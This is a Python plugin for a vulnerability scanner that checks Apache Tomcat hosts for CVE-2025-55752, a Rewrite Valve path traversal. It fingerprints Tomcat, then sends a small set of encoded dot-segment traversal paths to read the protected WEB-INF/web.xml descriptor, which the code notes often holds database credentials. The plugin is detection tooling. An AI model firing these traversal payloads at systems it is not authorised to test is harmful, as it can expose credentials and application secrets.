"""CVE-2025-55752 — Apache Tomcat path traversal via the Rewrite Valve.

When Tomcat is configured with the Rewrite Valve (``rewrite.config``), a
crafted, rewrite-decoded path can traverse out of the web application context
and reach files that Tomcat's security constraints normally protect — most
notably the ``/WEB-INF/`` and ``/META-INF/`` directories. ``WEB-INF/web.xml``
routinely contains JDBC/database credentials, JNDI resource definitions, and
application secrets, so reading it is a direct credential-disclosure primitive.

This probe is BENIGN and read-only. It performs no exploitation beyond a single
GET that *attempts* to read the world-irrelevant, non-destructive
``WEB-INF/web.xml`` deployment descriptor — a file whose mere readability proves
the protection is bypassed. Nothing is written and no state changes.

Flow:

    1. GET /                       — fingerprint Tomcat via the ``Server`` header
                                     (and the default error/landing page).
    2. GET <traversal>/WEB-INF/web.xml
                                   — the protected descriptor. Tomcat returns
                                     ``404``/``403`` for a normal request; a
                                     ``200`` whose body looks like a web.xml
                                     (``<web-app`` marker) confirms traversal.

Severity:
    * HIGH   — the protected ``WEB-INF/web.xml`` was returned (200 + ``<web-app``
               marker). The path-traversal read is confirmed.
    * MEDIUM — the host fingerprints as Tomcat *and* a normally-protected path
               returns a non-403/404 status (200 with non-descriptor body, or a
               redirect/auth surface) — a candidate worth a manual check, but the
               traversal read itself was not confirmed on this probe.
    * none   — not Tomcat, or the protected path is correctly blocked (403/404)
               and no Tomcat fingerprint was found.

[Worker decision: plugin filename is cve_2025_55752.py (underscores) because the
runner discovers plugins via importlib and module names cannot contain hyphens.
The canonical CVE id lives in metadata["vuln_id"], matching the existing
cve_2009_3548.py / cve_2024_23897.py convention.]
"""

from __future__ import annotations

from typing import Any

import httpx

from miasma.core import Finding, Target

metadata = {
    "vuln_id": "CVE-2025-55752",
    "name": "Apache Tomcat Rewrite Valve path traversal",
    "description": (
        "Apache Tomcat with the Rewrite Valve configured allows a crafted path "
        "to traverse into protected /WEB-INF/ and /META-INF/ directories, "
        "disclosing web.xml, application classes, and embedded credentials."
    ),
    "confidence": "high",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2025-55752",
    ],
    # HTTP-class ports we consider; also the fallback when recon found none.
    # port_hint is the canonical field the runner reads to skip irrelevant
    # plugins; default_ports is kept as the in-probe fallback alias.
    "port_hint": [8080, 8443, 80, 443],
    "service_hint": ["http", "https"],
    "default_ports": [8080, 8443, 80, 443],
}

# Traversal-crafted paths that, on a Rewrite-Valve-configured Tomcat, decode to
# the protected web.xml descriptor. Tomcat normalises ``/`` but a rewrite pass
# re-decodes encoded separators, so encoded dot-segments slip past the security
# constraint. We try a small ordered set of well-known shapes; all are read-only
# GETs against the inert deployment descriptor.
_TRAVERSAL_PATHS = (
    "/WEB-INF/web.xml",
    "/%2e%2e/WEB-INF/web.xml",
    "/..%2f..%2fWEB-INF%2fweb.xml",
    "/%2e%2e%2fWEB-INF%2fweb.xml",
    "/static/..%2f..%2fWEB-INF%2fweb.xml",
)

# Substring that marks a Tomcat host in the Server header (case-insensitive).
_TOMCAT_MARKERS = ("tomcat", "coyote", "apache-coyote")

# Marker that proves we got a deployment descriptor back, not a generic page.
_WEBXML_MARKER = "<web-app"

# TLS ports where we should speak https.
_TLS_PORTS = (443, 8443)

_TIMEOUT = 5.0


def _candidate_ports(target: Target) -> list[int]:
    """Prefer recon-discovered open HTTP-ish ports; else the defaults."""
    open_ports = target.open_ports()
    if open_ports:
        http_like = [
            port
            for port in open_ports
            if "http" in target.service(port).get("name", "").lower()
            or port in metadata["default_ports"]
        ]
        return http_like or open_ports
    return list(metadata["default_ports"])


def _scheme(port: int) -> str:
    return "https" if port in _TLS_PORTS else "http"


def _get(url: str) -> httpx.Response | None:
    """Benign GET; returns None on any transport error."""
    try:
        return httpx.get(
            url,
            timeout=_TIMEOUT,
            verify=False,
            follow_redirects=False,
        )
    except httpx.HTTPError:
        return None


def _server_header(resp: httpx.Response | None) -> str:
    if resp is None:
        return ""
    return resp.headers.get("server", "")


def _is_tomcat(server: str) -> bool:
    lowered = server.lower()
    return any(marker in lowered for marker in _TOMCAT_MARKERS)


def _looks_like_web_xml(resp: httpx.Response) -> bool:
    """True when the body looks like a deployment descriptor (not a stub page)."""
    try:
        body = resp.text
    except (UnicodeDecodeError, httpx.HTTPError):
        return False
    return _WEBXML_MARKER in body.lower()


def probe(target: Target) -> Finding | None:
    medium_evidence: dict[str, Any] | None = None

    for port in _candidate_ports(target):
        base = f"{_scheme(port)}://{target.host}:{port}"

        # 1. Fingerprint: is this a Tomcat host at all?
        root = _get(f"{base}/")
        if root is None:
            continue
        server = _server_header(root)
        tomcat = _is_tomcat(server)

        # 2. Attempt to read the protected descriptor via traversal shapes.
        for path in _TRAVERSAL_PATHS:
            resp = _get(f"{base}{path}")
            if resp is None:
                continue
            status = resp.status_code

            # Correctly protected — keep trying other shapes / ports.
            if status in (403, 404):
                continue

            if status == 200 and _looks_like_web_xml(resp):
                # The traversal read is confirmed: protected web.xml leaked.
                return Finding(
                    vuln_id=metadata["vuln_id"],
                    host=target.host,
                    confidence="high",
                    evidence={
                        "base_url": base,
                        "traversal_path": path,
                        "status_code": status,
                        "server_header": server,
                        "marker": _WEBXML_MARKER,
                    },
                    description=metadata["description"],
                )

            # A non-403/404 status on a normally-protected path is suspicious.
            # Only flag it (MEDIUM) when the host fingerprints as Tomcat, so we
            # don't raise noise on unrelated servers. Remember the first such
            # hit; a confirmed HIGH on a later port still wins.
            if tomcat and medium_evidence is None:
                medium_evidence = {
                    "base_url": base,
                    "traversal_path": path,
                    "status_code": status,
                    "server_header": server,
                    "note": (
                        "Tomcat fingerprinted and a normally-protected path "
                        "returned a non-403/404 status, but the WEB-INF/web.xml "
                        "read was not confirmed — manual check recommended."
                    ),
                }

    if medium_evidence is not None:
        return Finding(
            vuln_id=metadata["vuln_id"],
            host=target.host,
            confidence="medium",
            evidence=medium_evidence,
            description=metadata["description"],
        )

    return None
